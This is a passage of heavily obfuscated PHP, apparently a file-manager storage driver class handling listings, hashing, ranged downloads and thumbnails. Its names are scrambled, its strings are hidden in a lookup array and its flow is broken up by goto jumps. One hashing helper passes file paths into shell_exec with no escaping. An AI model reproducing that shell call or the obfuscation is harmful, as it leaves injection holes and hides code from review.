infoAuth($C„„¶‚§Õ¨) { return $this->info($C„„¶‚§Õ¨); } public function infoFull($a ŠŞêŞøÁ) { return $this->info($a ŠŞêŞøÁ); } public function infoWithChildren($eŞ ‘÷±Ğ) { $AÉ®ÕÅëËì =& $_SERVER[Ïº«‚ßèÔˆø]; static $C¿‰×´š¹ = array(); if (isset($C¿‰×´š¹[$eŞ ‘÷±Ğ])) { return $C¿‰×´š¹[$eŞ ‘÷±Ğ]; } $aï¸œÉ„©© = $this->info($eŞ ‘÷±Ğ); if ($aï¸œÉ„©© && $aï¸œÉ„©©[$AÉ®ÕÅëËì[29]] == $AÉ®ÕÅëËì[77]) { $cÍÆ‘ëÓ›á = array($AÉ®ÕÅëËì[78] => 0, $AÉ®ÕÅëËì[79] => 0, $AÉ®ÕÅëËì[80] => 0); $this->infoChildren($eŞ ‘÷±Ğ, $cÍÆ‘ëÓ›á); $aï¸œÉ„©©[$AÉ®ÕÅëËì[78]] = $cÍÆ‘ëÓ›á[$AÉ®ÕÅëËì[78]]; $aï¸œÉ„©©[$AÉ®ÕÅëËì[81]] = array($AÉ®ÕÅëËì[82] => $cÍÆ‘ëÓ›á[$AÉ®ÕÅëËì[79]], $AÉ®ÕÅëËì[83] => $cÍÆ‘ëÓ›á[$AÉ®ÕÅëËì[80]]); $C¿‰×´š¹[$eŞ ‘÷±Ğ] = $aï¸œÉ„©©; } return $aï¸œÉ„©©; } public function listPath($eŒÈø¦ÚÔÓ, $Aƒäà½§Íñ = false) { } public function has($A×İÎ§“·ï, $Fèï÷•Ä…Ü = false, $c¦í¥½¥Ùâ = false) { } public function canRead($dËŒ…ªñ„°) { } public function canWrite($E¡”¹²‡Åì) { } public function getContent($A’ÑÄŸé) { } public function setContent($Cšá‰³É¶, $EÒ®Ã¯§Ì£ = '') { } protected function infoChildren($fİÖ‘ˆÈ˜, &$d¹åİñ×‰õ) { $E‘ÛŒ³”ƒ— =& $_SERVER[Ïº«‚ßèÔˆø]; check_abort_echo(); $D÷ñ¦ÑšÕ = $this->listPath($fİÖ‘ˆÈ˜, !0); $D÷ñ¦ÑšÕ = array_merge($D÷ñ¦ÑšÕ[$E‘ÛŒ³”ƒ—[75]], $D÷ñ¦ÑšÕ[$E‘ÛŒ³”ƒ—[74]]); foreach ($D÷ñ¦ÑšÕ as $dÈƒ÷ŞŠ©) { if ($dÈƒ÷ŞŠ©[$E‘ÛŒ³”ƒ—[29]] == $E‘ÛŒ³”ƒ—[77]) { $d¹åİñ×‰õ[$E‘ÛŒ³”ƒ—[80]]++; $C·ÂÂôùŒ = $this->getPathInner($dÈƒ÷ŞŠ©[$E‘ÛŒ³”ƒ—[76]]); $this->infoChildren($C·ÂÂôùŒ, $d¹åİñ×‰õ); } else { $d¹åİñ×‰õ[$E‘ÛŒ³”ƒ—[79]]++; $d¹åİñ×‰õ[$E‘ÛŒ³”ƒ—[78]] += $dÈƒ÷ŞŠ©[$E‘ÛŒ³”ƒ—[78]]; } } } public function fileSubstr($då‘°Èè´¶, $dàÁ‚õÊ†’, $d‰‹ïÖÅ¯) { } public function listAll($EŠ“Áİ®´•) { } public function listAllMake($fì÷‘ÍÅ­¼, &$FÓöÏÎ¬ßŒ) { $cñ‰éñç² =& $_SERVER[Ïº«‚ßèÔˆø]; check_abort_echo(); $B¬™•”‘è = $this->listPath($fì÷‘ÍÅ­¼, !0); if (!$B¬™•”‘è) { return; } $aŞØ³îã­… = array_merge($B¬™•”‘è[$cñ‰éñç²[75]], $B¬™•”‘è[$cñ‰éñç²[74]]); foreach ($aŞØ³îã­… as $A·™¥åÄ»–) { goto c‚¥‰êÚ“Ê; fÑ©îã¯Í: if (isset($A·™¥åÄ»–[$cñ‰éñç²[84]])) { $c£™¹•×¿ì[$cñ‰éñç²[84]] = $A·™¥åÄ»–[$cñ‰éñç²[84]]; } if (!$DÉÀ¶½¼Ì) { $FÓöÏÎ¬ßŒ[] = $c£™¹•×¿ì; continue; } $FÓöÏÎ¬ßŒ[] = $c£™¹•×¿ì; goto béì·îšØÑ; c‚¥‰êÚ“Ê: $DÉÀ¶½¼Ì = $A·™¥åÄ»–[$cñ‰éñç²[29]] == $cñ‰éñç²[77]; $c£™¹•×¿ì = array($cñ‰éñç²[76] => $A·™¥åÄ»–[$cñ‰éñç²[76]], $cñ‰éñç²[77] => $DÉÀ¶½¼Ì); if (isset($A·™¥åÄ»–[$cñ‰éñç²[78]])) { $c£™¹•×¿ì[$cñ‰éñç²[78]] = $A·™¥åÄ»–[$cñ‰éñç²[78]]; } goto fÑ©îã¯Í; béì·îšØÑ: $this->listAllMake($A·™¥åÄ»–[$cñ‰éñç²[76]], $FÓöÏÎ¬ßŒ); goto b’–‡…ÎëÅ; b’–‡…ÎëÅ: } } public function listAllSimple($eìñò»³¸) { $aÙƒØÖò¬‚ =& $_SERVER[Ïº«‚ßèÔˆø]; $Bö ‡·‡ = array(); $aÏŸÃˆğğ = $this->listAll($eìñò»³¸); $E¡Ûª¯Õòİ = $this->getPathOuter($eìñò»³¸); foreach ($aÏŸÃˆğğ as $CÒĞ»«ÚÃ·) { goto BŞ¸Ù¹ÉŒÃ; E½Ûïøø©‚: $EºË‚§Šã× = array($aÙƒØÖò¬‚[76] => $cïï¿ëØÀˆ, $aÙƒØÖò¬‚[77] => $CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[77]]); if (isset($CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[78]]) && !$CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[77]]) { $EºË‚§Šã×[$aÙƒØÖò¬‚[78]] = $CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[78]]; } if (isset($CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[84]])) { $EºË‚§Šã×[$aÙƒØÖò¬‚[84]] = $CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[84]]; } goto a ¡¼‹ÅÜö; BŞ¸Ù¹ÉŒÃ: $dõ¼áõ´Ù = $CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[76]]; $cïï¿ëØÀˆ = $CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[76]]; if (isset($CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[85]])) { $dõ¼áõ´Ù = $CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[85]][$aÙƒØÖò¬‚[76]]; $CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[78]] = $CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[85]][$aÙƒØÖò¬‚[78]]; $CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[84]] = $CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[85]][$aÙƒØÖò¬‚[84]]; } else { $cïï¿ëØÀˆ = substr($CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[76]], strlen(get_path_father($E¡Ûª¯Õòİ))); $cïï¿ëØÀˆ = $aÙƒØÖò¬‚[8] . ltrim($cïï¿ëØÀˆ, $aÙƒØÖò¬‚[8]); } goto E½Ûïøø©‚; a ¡¼‹ÅÜö: if (!$CÒĞ»«ÚÃ·[$aÙƒØÖò¬‚[77]]) { $EºË‚§Šã×[$aÙƒØÖò¬‚[86]] = $dõ¼áõ´Ù; } $Bö ‡·‡[] = $EºË‚§Šã×; goto Cë¨ÀàØÓÚ; Cë¨ÀàØÓÚ: } return $Bö ‡·‡; } public function upload($Dä­‰–˜×, $E¦ËÕÎáÂ’, $E…ªĞÕì¶† = false, $DÙ›á¬…ˆÊ = REPEAT_REPLACE) { } public function uploadFileByID($bá÷›ô§†, $e‹Øµáİáø, $F˜¢¢õÎõ) { } public function uploadFileByPath($déÅ¿ º‹Ì, $CÓ·†’©…, $Bø£Şî–²‡ = array()) { } public function isUploadServer() { $Bµœ¼ß„¸† =& $_SERVER[Ïº«‚ßèÔˆø]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Bµœ¼ß„¸†[87]) { return !0; } return $GLOBALS[$Bµœ¼ß„¸†[6]][$Bµœ¼ß„¸†[88]][$Bµœ¼ß„¸†[89]]; } public function isFileOutServer() { $FÜæË°âéŸ =& $_SERVER[Ïº«‚ßèÔˆø]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $FÜæË°âéŸ[87]) { return !0; } return $GLOBALS[$FÜæË°âéŸ[6]][$FÜæË°âéŸ[88]][$FÜæË°âéŸ[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($D™‡¤ÑŞá÷) { $f¿ò®»É ± =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->isCdnHost()) { return $D™‡¤ÑŞá÷; } return str_replace(trim(get_url_root($D™‡¤ÑŞá÷), $f¿ò®»É ±[8]), trim($this->cdnHost, $f¿ò®»É ±[8]), $D™‡¤ÑŞá÷); } public function uploadLink($EåÙ§ïºù, $Aˆô¦–á• = 0) { goto a¾£¯£¶”¯; BçÖ ğŒÒ: if (!in_array($AäìÒ—ÃŠ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $FÒ²„Šß¥ = 1024 * 1024 * 10; goto F†¥æì–­Ÿ; a¾£¯£¶”¯: $a¸Å–¸ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($this->isUploadServer()) { return; } $AäìÒ—ÃŠ = $this->getType(); goto BçÖ ğŒÒ; F†¥æì–­Ÿ: $C„Ã„î”Â = $Aˆô¦–á• <= $FÒ²„Šß¥ ? $a¸Å–¸[91] : $a¸Å–¸[92]; $d×Àİ£÷Ó‹ = (!$Aˆô¦–á• ? 1 : ceil($Aˆô¦–á• / pow(1024, 3))) * 3600 * 4; $dš÷±ˆ«“ = $this->{$C„Ã„î”Â}($EåÙ§ïºù, $d×Àİ£÷Ó‹); goto fŸë˜¯Éåƒ; fŸë˜¯Éåƒ: if ($dš÷±ˆ«“) { $dš÷±ˆ«“[$a¸Å–¸[93]] = $EåÙ§ïºù; $dš÷±ˆ«“[$a¸Å–¸[94]] = $AäìÒ—ÃŠ; } return $dš÷±ˆ«“; goto fóºª°Ò‹; fóºª°Ò‹: } public function uploadFormData($A¾Ö‘ßÍŸ®, $FºÍÕâ¦ÒÊ = 3600) { } public function multiUploadFormData($Bïå¨”¯ÆŒ, $aÁ†ŒŸ˜æ¿ = 3600) { } public function download($B¿×¼ÙéÍ², $bÑÓ‰ŞÇ„) { } public function ext($f¸šëÂ‰¡Û) { $BáªÛ†š‡Ê =& $_SERVER[Ïº«‚ßèÔˆø]; if (strpos($f¸šëÂ‰¡Û, $BáªÛ†š‡Ê[8]) === -1) { $b§÷åÅÂŠ = $f¸šëÂ‰¡Û; } else { $b§÷åÅÂŠ = $this->pathThis($f¸šëÂ‰¡Û); } $d§óãÑ‘®Õ = $BáªÛ†š‡Ê[33]; if (strstr($b§÷åÅÂŠ, $BáªÛ†š‡Ê[95])) { $d§óãÑ‘®Õ = substr($b§÷åÅÂŠ, strrpos($b§÷åÅÂŠ, $BáªÛ†š‡Ê[95]) + 1); $d§óãÑ‘®Õ = strtolower($d§óãÑ‘®Õ); } if (strlen($d§óãÑ‘®Õ) > 3 && preg_match($BáªÛ†š‡Ê[96], $d§óãÑ‘®Õ, $BªìˆìÆ×)) { $d§óãÑ‘®Õ = $BáªÛ†š‡Ê[33]; } return $d§óãÑ‘®Õ; } public function pathThis($d˜Í¾ÆÜÛò) { $D°ĞãÚ˜ÜÙ =& $_SERVER[Ïº«‚ßèÔˆø]; $d˜Í¾ÆÜÛò = str_replace($D°ĞãÚ˜ÜÙ[97], $D°ĞãÚ˜ÜÙ[8], rtrim($d˜Í¾ÆÜÛò, $D°ĞãÚ˜ÜÙ[8])); $dìíİÜ©ğ• = strrpos($d˜Í¾ÆÜÛò, $D°ĞãÚ˜ÜÙ[8]); if ($dìíİÜ©ğ• === !1) { return $d˜Í¾ÆÜÛò; } return substr($d˜Í¾ÆÜÛò, $dìíİÜ©ğ• + 1); } public function pathFather($fÅ¾Ìá…Ó¼) { $BáÕÒ÷óÄâ =& $_SERVER[Ïº«‚ßèÔˆø]; $fÅ¾Ìá…Ó¼ = str_replace($BáÕÒ÷óÄâ[97], $BáÕÒ÷óÄâ[8], rtrim($fÅ¾Ìá…Ó¼, $BáÕÒ÷óÄâ[8])); $A˜ÊØ¨ƒÔÙ = strrpos($fÅ¾Ìá…Ó¼, $BáÕÒ÷óÄâ[8]); if ($A˜ÊØ¨ƒÔÙ === !1) { return $BáÕÒ÷óÄâ[33]; } return substr($fÅ¾Ìá…Ó¼, 0, $A˜ÊØ¨ƒÔÙ + 1); } public function hashSimple($a¬¼¨İ‹Ğ§) { goto BóóçÅÒß; BóóçÅÒß: $F¦óòÉ‚ÑÅ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$a¬¼¨İ‹Ğ§) { return md5($F¦óòÉ‚ÑÅ[33]); } $fˆ¥Ùùß®Û = $this->size($a¬¼¨İ‹Ğ§); goto e­®Ş¾°ŞÆ; C°‰Ö˜œĞ: $Fáé‹²Ô = intval($fˆ¥Ùùß®Û / $eÒ¤ î‘µ‘); $eíğÖÛ´§Ï = $F¦óòÉ‚ÑÅ[33]; for ($E¯óÌ¯ÓÓ = 0; $E¯óÌ¯ÓÓ < $eÒ¤ î‘µ‘; $E¯óÌ¯ÓÓ++) { $eíğÖÛ´§Ï .= $this->fileSubstr($a¬¼¨İ‹Ğ§, $Fáé‹²Ô * $E¯óÌ¯ÓÓ, $F¨ğ˜¯é…ñ); } goto a…×Ïšºµ; a…×Ïšºµ: $eíğÖÛ´§Ï .= $this->fileSubstr($a¬¼¨İ‹Ğ§, $fˆ¥Ùùß®Û - $F¨ğ˜¯é…ñ, $F¨ğ˜¯é…ñ); return md5($eíğÖÛ´§Ï) . $fˆ¥Ùùß®Û; goto F®İš‡ƒ“œ; e­®Ş¾°ŞÆ: $F¨ğ˜¯é…ñ = 200; $eÒ¤ î‘µ‘ = 50; if ($fˆ¥Ùùß®Û <= $F¨ğ˜¯é…ñ * $eÒ¤ î‘µ‘) { return $this->hashMd5($a¬¼¨İ‹Ğ§) . $fˆ¥Ùùß®Û; } goto C°‰Ö˜œĞ; F®İš‡ƒ“œ: } public static $md5Cache = array(); public function hashMd5($FÃ‘Ò÷„¼) { $FÃ‘Ò÷„¼ = $this->iconvSystem($FÃ‘Ò÷„¼); if (isset(self::$md5Cache[$FÃ‘Ò÷„¼])) { return self::$md5Cache[$FÃ‘Ò÷„¼]; } self::$md5Cache[$FÃ‘Ò÷„¼] = $this->hashMd5Shell($FÃ‘Ò÷„¼); if (!self::$md5Cache[$FÃ‘Ò÷„¼]) { self::$md5Cache[$FÃ‘Ò÷„¼] = @md5_file($FÃ‘Ò÷„¼); } return self::$md5Cache[$FÃ‘Ò÷„¼]; } private function hashMd5Shell($fÄÄ·˜Êöã) { goto B ˆâ¯Òµì; B ˆâ¯Òµì: $B–¨Àõ¯¡ï =& $_SERVER[Ïº«‚ßèÔˆø]; if (!function_exists($B–¨Àõ¯¡ï[98])) { return !1; } $c‚ëÆÂ×®× = array($B–¨Àõ¯¡ï[99], $B–¨Àõ¯¡ï[100]); goto F¥ÄîÚ‡¥ù; dè„ãˆÑİä: $BòÆ©…Şœô = shell_exec($c‚İ©ëŒÔÑ . "\x20\42{$fÄÄ·˜Êöã}\42"); $BòÆ©…Şœô = str_replace($B–¨Àõ¯¡ï[104], $B–¨Àõ¯¡ï[33], $BòÆ©…Şœô); return substr($BòÆ©…Şœô, 0, 32); goto fëç·‘™; F¥ÄîÚ‡¥ù: $c‚İ©ëŒÔÑ = Cache::get($B–¨Àõ¯¡ï[101]); if (!$c‚İ©ëŒÔÑ) { $e†²¢…„œ = BASIC_PATH . $B–¨Àõ¯¡ï[102]; $Aªôç’­±ç = md5_file($e†²¢…„œ); $c‚İ©ëŒÔÑ = $B–¨Àõ¯¡ï[103]; foreach ($c‚ëÆÂ×®× as $FÆ†îÕéÌ¼) { $BòÆ©…Şœô = shell_exec($FÆ†îÕéÌ¼ . "\40\x22{$e†²¢…„œ}\x22"); if ($BòÆ©…Şœô && substr(trim($BòÆ©…Şœô), 0, 32) == $Aªôç’­±ç) { $c‚İ©ëŒÔÑ = $FÆ†îÕéÌ¼; break; } } Cache::set($B–¨Àõ¯¡ï[101], $c‚İ©ëŒÔÑ, 3600); } if ($c‚İ©ëŒÔÑ == $B–¨Àõ¯¡ï[103]) { return !1; } goto dè„ãˆÑİä; fëç·‘™: } public function link($dùÑˆ¤êÚ) { return $dùÑˆ¤êÚ; } public function fileOut($dçï¬‰ª¸Ù, $béÇÑÄà†Ğ = false, $e…·À­ÄŸˆ = false, $Fó·ãùéƒç = '') { goto eÀ„ğĞ‰ò½; eÜ‘ôë¬‚: if ($eæ²º¿¢ÊÌ) { $C¹š£Ÿ¥¹ = intval(1000 * 1000 * ($EóÀ­‚Æ‚š / $eæ²º¿¢ÊÌ)); } while ($féØÇåñ‘ <= $FØÊéÒîìù) { $Bí±§´¼Ğä = timeFloat(); check_abort(); $A†Õæà¡ùÍ = $FØÊéÒîìù - $féØÇåñ‘ + 1; if ($A†Õæà¡ùÍ <= $EóÀ­‚Æ‚š) { $EóÀ­‚Æ‚š = $A†Õæà¡ùÍ; } echo $this->fileSubstr($dçï¬‰ª¸Ù, $féØÇåñ‘, $EóÀ­‚Æ‚š); $féØÇåñ‘ += $EóÀ­‚Æ‚š; if ($EóÀ­‚Æ‚š == $A†Õæà¡ùÍ) { $féØÇåñ‘ = $FØÊéÒîìù + 1; } if ($C¹š£Ÿ¥¹) { $BìÙ•ÖÎÙ‹ = intval(1000 * 1000 * (timeFloat() - $Bí±§´¼Ğä)); $eñ·‹”¡ƒ = $C¹š£Ÿ¥¹ - $BìÙ•ÖÎÙ‹; if ($eñ·‹”¡ƒ > 5) { usleep($eñ·‹”¡ƒ); } } } goto f•‘Øˆ´Š½; fäƒÂâ±™Â: $Ašë¢°Üˆ = $eæ¹¤˜Ä“¡[$F¹‘òï»ÅÛ[78]]; $Eö¦Õ¿½î = gmdate($F¹‘òï»ÅÛ[110], $eæ¹¤˜Ä“¡[$F¹‘òï»ÅÛ[84]]); $EàÂÈæÖƒ± = $e…·À­ÄŸˆ ? $e…·À­ÄŸˆ : $this->iconvApp($eæ¹¤˜Ä“¡[$F¹‘òï»ÅÛ[28]]); goto E’Ğ»¾®µ˜; dÄóÎ”ÎÇÔ: $FèğùñØÌ = !0; if ($_SERVER[$F¹‘òï»ÅÛ[154]] == $F¹‘òï»ÅÛ[155] && $Ašë¢°Üˆ > 1204 * 1024 * 1024 * 2) { $FèğùñØÌ = !1; } if ($FèğùñØÌ) { header($F¹‘òï»ÅÛ[156] . ($FØÊéÒîìù - $féØÇåñ‘ + 1)); } goto e¥¬•˜÷ÉÊ; BšàÅ¼…Ñˆ: header($F¹‘òï»ÅÛ[128]); header($F¹‘òï»ÅÛ[129]); header($F¹‘òï»ÅÛ[130]); goto cÆæ²“×¯ƒ; AŒË¥ÕÒ›…: if (in_array($FŒÒ‡ÍÒÄ…, array($F¹‘òï»ÅÛ[111], $F¹‘òï»ÅÛ[112], $F¹‘òï»ÅÛ[113], $F¹‘òï»ÅÛ[114]))) { $FŒÒ‡ÍÒÄ… = $F¹‘òï»ÅÛ[115]; } if (!$Fó·ãùéƒç) { $Fó·ãùéƒç = md5($Eö¦Õ¿½î . $this->hashSimple($dçï¬‰ª¸Ù)); } $Fó·ãùéƒç = $F¹‘òï»ÅÛ[116] . $Fó·ãùéƒç . $F¹‘òï»ÅÛ[116]; goto CÒõ¤¹ø…Í; CƒˆÛ±ãå•: header($F¹‘òï»ÅÛ[120]); header($F¹‘òï»ÅÛ[121] . $bÓõ—ŠÃçß); $a‡İô¼§èæ = rawurlencode($EàÂÈæÖƒ±); goto cÓŒÛã‚‘; C²Ç¨˜†Çç: @ob_end_clean(); set_timeout(); $eæ¹¤˜Ä“¡ = $this->infoFull($dçï¬‰ª¸Ù); goto fäƒÂâ±™Â; cÓŒÛã‚‘: $a‡İô¼§èæ = $F¹‘òï»ÅÛ[116] . $a‡İô¼§èæ . $F¹‘òï»ÅÛ[122] . $a‡İô¼§èæ; if ($béÇÑÄà†Ğ) { header($F¹‘òï»ÅÛ[123]); header($F¹‘òï»ÅÛ[124] . $a‡İô¼§èæ); } else { header($F¹‘òï»ÅÛ[125] . $a‡İô¼§èæ); } header($F¹‘òï»ÅÛ[126] . gmdate($F¹‘òï»ÅÛ[110], time() + 3600 * 24 * 30) . $F¹‘òï»ÅÛ[127]); goto BšàÅ¼…Ñˆ; CÒõ¤¹ø…Í: $bÓõ—ŠÃçß = get_file_mime($FŒÒ‡ÍÒÄ…); if (strstr($bÓõ—ŠÃçß, $F¹‘òï»ÅÛ[117])) { $bÓõ—ŠÃçß = $bÓõ—ŠÃçß . $F¹‘òï»ÅÛ[118]; } if ($béÇÑÄà†Ğ === !1 && !mime_support($bÓõ—ŠÃçß)) { $béÇÑÄà†Ğ = !0; $bÓõ—ŠÃçß = $F¹‘òï»ÅÛ[119]; } goto CƒˆÛ±ãå•; cãÈê»¢¬Ö: $DÃÜ–”—ì° = $this->getType() == $F¹‘òï»ÅÛ[106]; $B¾¿œóÉé = $GLOBALS[$F¹‘òï»ÅÛ[6]][$F¹‘òï»ÅÛ[88]][$F¹‘òï»ÅÛ[107]][$F¹‘òï»ÅÛ[108]]; $eæ²º¿¢ÊÌ = (double) $GLOBALS[$F¹‘òï»ÅÛ[6]][$F¹‘òï»ÅÛ[88]][$F¹‘òï»ÅÛ[107]][$F¹‘òï»ÅÛ[109]] * 1024 * 1024; goto C²Ç¨˜†Çç; C¹šëĞĞõƒ: header($F¹‘òï»ÅÛ[138] . $Ašë¢°Üˆ); header($F¹‘òï»ÅÛ[139]); if (!$béÇÑÄà†Ğ && $FŒÒ‡ÍÒÄ… == $F¹‘òï»ÅÛ[140]) { if ($Ašë¢°Üˆ > 1024 * 1024 * 5) { die; } $d«³Ø‹ä‘Ÿ = $this->getContent($dçï¬‰ª¸Ù); $d«³Ø‹ä‘Ÿ = Html::clearSVG($d«³Ø‹ä‘Ÿ); header($F¹‘òï»ÅÛ[141] . strlen($d«³Ø‹ä‘Ÿ)); echo $d«³Ø‹ä‘Ÿ; die; } goto b¦îÁªùô—; DÅ¸©§îÙÑ: header($F¹‘òï»ÅÛ[135] . $Eö¦Õ¿½î . $F¹‘òï»ÅÛ[127]); header($F¹‘òï»ÅÛ[136] . $EàÂÈæÖƒ±); header($F¹‘òï»ÅÛ[137]); goto C¹šëĞĞõƒ; E’Ğ»¾®µ˜: $féØÇåñ‘ = 0; $FØÊéÒîìù = $Ašë¢°Üˆ - 1; $FŒÒ‡ÍÒÄ… = $this->ext($EàÂÈæÖƒ±); goto AŒË¥ÕÒ›…; eÀ„ğĞ‰ò½: $F¹‘òï»ÅÛ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->cacheMethod(null, null); if (!$dçï¬‰ª¸Ù || !$this->exist($dçï¬‰ª¸Ù)) { show_json(LNG($F¹‘òï»ÅÛ[105]), !1, $e…·À­ÄŸˆ); } goto cãÈê»¢¬Ö; b¦îÁªùô—: $aËÍ›Â¥¤é = strtolower($_SERVER[$F¹‘òï»ÅÛ[142]]); if ($DÃÜ–”—ì° && $aËÍ›Â¥¤é && $B¾¿œóÉé) { if (strstr($aËÍ›Â¥¤é, $F¹‘òï»ÅÛ[143])) { header($F¹‘òï»ÅÛ[144] . $dçï¬‰ª¸Ù); } else { if (strstr($aËÍ›Â¥¤é, $F¹‘òï»ÅÛ[145])) { header($F¹‘òï»ÅÛ[146] . $dçï¬‰ª¸Ù); } else { if (strstr($aËÍ›Â¥¤é, $F¹‘òï»ÅÛ[147])) { header($F¹‘òï»ÅÛ[148] . $dçï¬‰ª¸Ù); } } } if ($eæ²º¿¢ÊÌ) { header($F¹‘òï»ÅÛ[149] . $eæ²º¿¢ÊÌ); } return; } if (isset($_SERVER[$F¹‘òï»ÅÛ[150]])) { if (preg_match($F¹‘òï»ÅÛ[151], $_SERVER[$F¹‘òï»ÅÛ[150]], $BÊ¨À¯¯Œ)) { $féØÇåñ‘ = intval($BÊ¨À¯¯Œ[1]); if (!empty($BÊ¨À¯¯Œ[2])) { $FØÊéÒîìù = intval($BÊ¨À¯¯Œ[2]); } } header($F¹‘òï»ÅÛ[152]); header("\103\157\156\164\x65\156\164\55\122\141\156\x67\145\72\x20\x62\171\x74\145\x73\x20{$féØÇåñ‘}\x2d{$FØÊéÒîìù}\57" . $Ašë¢°Üˆ); } else { header($F¹‘òï»ÅÛ[153]); } goto dÄóÎ”ÎÇÔ; cÆæ²“×¯ƒ: if (isset($_SERVER[$F¹‘òï»ÅÛ[131]]) && strtotime($_SERVER[$F¹‘òï»ÅÛ[131]]) == $eæ¹¤˜Ä“¡[$F¹‘òï»ÅÛ[84]]) { header($F¹‘òï»ÅÛ[132], !0, 304); die; } if (isset($_SERVER[$F¹‘òï»ÅÛ[133]]) && $_SERVER[$F¹‘òï»ÅÛ[133]] == $Fó·ãùéƒç) { header($F¹‘òï»ÅÛ[134] . $Fó·ãùéƒç, !0, 304); die; } header($F¹‘òï»ÅÛ[134] . $Fó·ãùéƒç); goto DÅ¸©§îÙÑ; e¥¬•˜÷ÉÊ: if ($_SERVER[$F¹‘òï»ÅÛ[157]] == $F¹‘òï»ÅÛ[158]) { return; } $EóÀ­‚Æ‚š = 1024 * 100; $C¹š£Ÿ¥¹ = 0; goto eÜ‘ôë¬‚; f•‘Øˆ´Š½: } public function fileOutServer($aÌêŞìœÍö, $Eë²“¬™Œ = false, $D˜­çÁù†Ù = false, $DÆœÑ…¹ºô = '') { $this->fileOut($aÌêŞìœÍö, $Eë²“¬™Œ, $D˜­çÁù†Ù, $DÆœÑ…¹ºô); } public function fileOutLink($FÙìùåÍÑ) { header($_SERVER[Ïº«‚ßèÔˆø][159] . $FÙìùåÍÑ); die; } public function cacheMethod($aÓğÅ½Ô², $d«Ÿé†Ğ½, $d©¦µÔÅê© = null) { goto D÷‚íÍÂ·ğ; CŸ†££Åİ†: $dÎƒğé¾–© = $this->{$aÓğÅ½Ô²}($d«Ÿé†Ğ½); $f‚ÊõÄ¼Ÿ[$D”Ï†¨­Ÿˆ] = $dÎƒğé¾–©; return $dÎƒğé¾–©; goto fÄŠíòŠŸ; D÷‚íÍÂ·ğ: $C¢÷åğÊà£ =& $_SERVER[Ïº«‚ßèÔˆø]; static $f‚ÊõÄ¼Ÿ = array(); $bíùÒ‰¥èÒ = $d«Ÿé†Ğ½ ? ltrim($this->getPathOuter($d«Ÿé†Ğ½), $C¢÷åğÊà£[8]) : $d«Ÿé†Ğ½; goto FÙ…¨‡…õä; D†•¢àÉóÕ: if (!is_null($d©¦µÔÅê©)) { $f‚ÊõÄ¼Ÿ[$D”Ï†¨­Ÿˆ] = $d©¦µÔÅê©; return; } $dÎƒğé¾–© = isset($f‚ÊõÄ¼Ÿ[$D”Ï†¨­Ÿˆ]) ? $f‚ÊõÄ¼Ÿ[$D”Ï†¨­Ÿˆ] : null; if (!is_null($dÎƒğé¾–©)) { return $dÎƒğé¾–©; } goto CŸ†££Åİ†; FÙ…¨‡…õä: $D”Ï†¨­Ÿˆ = $C¢÷åğÊà£[160] . $aÓğÅ½Ô² . $C¢÷åğÊà£[161] . rtrim($bíùÒ‰¥èÒ, $C¢÷åğÊà£[8]); if (is_null($aÓğÅ½Ô²)) { $f‚ÊõÄ¼Ÿ = array(); return; } if (is_null($d«Ÿé†Ğ½)) { unset($f‚ÊõÄ¼Ÿ[$D”Ï†¨­Ÿˆ]); return; } goto D†•¢àÉóÕ; fÄŠíòŠŸ: } public function fileOutImage($c®Êùª×´, $EŠºë‹Œñ = 250) { goto cïÎ¾Š; c„˜ğÙƒ½‘: del_file($fÌÈñÊ÷Û); IO::fileOut($A«§³ÎÌ—Ö); goto fŸÌğÖÕÓŒ; cï‰¥½ŠÉ†: $dßê²¨ŸíÚ = "{$A™åÑ®ç™¤}\137{$EŠºë‹Œñ}\x2e\160\156\x67"; if (!($c‹˜ìÚªÂÛ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $D¿—£çóãÛ[172]))) { $E¼°ª‡–¦ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $D¿—£çóãÛ[173]); } else { $E¼°ª‡–¦ = KodIO::make($c‹˜ìÚªÂÛ); } if ($c‹˜ìÚªÂÛ = IO::fileNameExist($E¼°ª‡–¦, $dßê²¨ŸíÚ)) { $fÌÈñÊ÷Û = KodIO::make($c‹˜ìÚªÂÛ); return IO::fileOut($fÌÈñÊ÷Û, !1, $C¶ö„Û»á); } goto e…ÍÏÆØùà; b¸††‡£Ó¡: if (isset($GLOBALS[$D¿—£çóãÛ[162]]) && $GLOBALS[$D¿—£çóãÛ[162]][$D¿—£çóãÛ[76]] == $AĞ£È¤ƒ[$D¿—£çóãÛ[76]]) { $C²Û¼ ¾Ó = $GLOBALS[$D¿—£çóãÛ[162]][$D¿—£çóãÛ[163]]; if (!$AĞ£È¤ƒ[$D¿—£çóãÛ[164]]) { $AĞ£È¤ƒ[$D¿—£çóãÛ[164]] = $GLOBALS[$D¿—£çóãÛ[162]]; } if (isset($C²Û¼ ¾Ó[$D¿—£çóãÛ[165]])) { if ($C²Û¼ ¾Ó[$D¿—£çóãÛ[165]] <= $EŠºë‹Œñ && $C²Û¼ ¾Ó[$D¿—£çóãÛ[166]] <= $EŠºë‹Œñ) { $a»ˆ°‚ÓÉ = !0; } } $C¶ö„Û»á = $AĞ£È¤ƒ[$D¿—£çóãÛ[164]][$D¿—£çóãÛ[28]]; } if ($AĞ£È¤ƒ[$D¿—£çóãÛ[78]] <= 1024 * 50 || $a»ˆ°‚ÓÉ || 